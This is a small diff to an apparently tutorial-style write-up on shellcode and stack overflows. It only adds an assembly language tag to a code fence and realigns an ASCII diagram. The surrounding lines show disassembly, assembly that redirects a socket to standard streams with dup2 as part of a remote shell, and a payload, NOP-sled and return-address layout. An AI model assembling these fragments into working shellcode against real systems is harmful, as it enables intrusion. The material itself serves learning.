@@ -418,7 +418,7 @@ we can use `%ecx` and use a `jns` (jump till %ecx > 0)
 	   0x08053fba <+10>:	mov    $0x3f,%eax
 	   0x08053fbf <+15>:	call   *0x80d6904
 ```
-```
+```assembly
 	;dup2(socket, i) where i = 0, 1 then 2;
 	mov %eax, %ebx      # %ebx is new_sockfd now
 	xor %eax, %eax      # why do I need this ?
@@ -862,7 +862,7 @@ So we see `0x30 0x31` and so on... this is our `0123...` So let's take `0x16e72f
  way that works better:
  
 	 _______________________________________________
-	| payload      |      NOPs	    |  new ret addr | 
+	| payload      |      NOPs	 |  new ret addr | 
 	|______________|________________|_______________|
 
 
